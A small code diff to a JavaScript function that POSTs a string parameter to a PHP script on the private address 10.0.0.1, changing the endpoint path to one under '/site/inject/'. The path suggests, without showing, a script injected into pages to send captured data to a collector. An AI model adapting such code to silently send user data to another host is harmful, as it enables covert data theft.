@@ -40,7 +40,7 @@ function AJAXPost(cadena)
     
     var params = "v=" + cadena;
     
-    xmlhttp.open("POST","http://10.0.0.1/tmp/getData.php",false);
+    xmlhttp.open("POST","http://10.0.0.1/site/inject/getData.php",false);
     xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     //xmlhttp.setRequestHeader("Content-length", params.length);
     //xmlhttp.setRequestHeader("Connection", "close");
